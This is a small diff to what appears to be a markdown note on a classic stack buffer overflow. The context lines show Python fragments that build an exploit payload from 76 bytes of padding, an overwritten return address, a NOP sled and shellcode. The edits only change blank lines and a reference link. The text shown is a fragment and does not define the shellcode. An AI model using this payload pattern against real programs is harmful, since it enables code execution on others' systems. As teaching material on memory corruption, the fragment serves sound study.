@@ -54,8 +54,6 @@ exploit
 
 python -c "print 'a'\*76+'\x30\xfc\xff\xbf'+'\x90'\*20+shellcode
 
-
-
 import struct
 
 pad = "\x41" \* 76
@@ -70,7 +68,9 @@ print pad + EIP + NOP + shellcode
 
 
 
+
+
 Ref：
 
-https://xz.aliyun.com/t/3908
+[https://xz.aliyun.com/t/3908](https://xz.aliyun.com/t/3908)
 
